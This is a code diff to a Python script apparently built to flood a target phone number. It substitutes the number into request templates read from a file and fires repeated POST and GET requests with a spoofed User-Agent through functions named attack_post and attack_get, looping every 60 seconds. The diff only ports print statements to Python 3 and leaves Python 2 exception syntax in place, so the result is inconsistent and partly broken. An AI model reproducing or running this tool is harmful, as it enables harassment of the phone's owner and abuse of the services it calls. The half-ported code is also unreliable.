@@ -22,10 +22,10 @@ def attack_post(mtfly):
                'User-Agent': 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac;'}
     try:
         requests.post(url, data=payload, headers=headers)
-        print 'post success!'
+        print('post success!')
     except Exception, e:
-        print e
-        print 'post fail!'
+        print(e)
+        print('post fail!')
 
 
 def attack_get(mtfly):
@@ -34,10 +34,10 @@ def attack_get(mtfly):
                'User-Agent': 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac;'}
     try:
         requests.get(url, headers=headers)
-        print 'get success!'
+        print('get success!')
     except Exception, e:
-        print e
-        print 'get fail!'
+        print(e)
+        print('get fail!')
 
 
 def attack(mi):
@@ -71,8 +71,8 @@ m = list()
 try:
     f = open('mtfly.txt', 'r')
 except Exception, e:
-    print e
-    print 'flie fail!'
+    print(e)
+    print('flie fail!')
 for eachLine in f.readlines():
     eachLine = sub('phone_number', pn, eachLine)
     eachLine = eachLine.strip()
@@ -81,7 +81,7 @@ for il in range(loop):
     t_attack(m)
     time.sleep(60)
 f.close()
-print 'all jobs done!'
+print('all jobs done!')
 
 
 
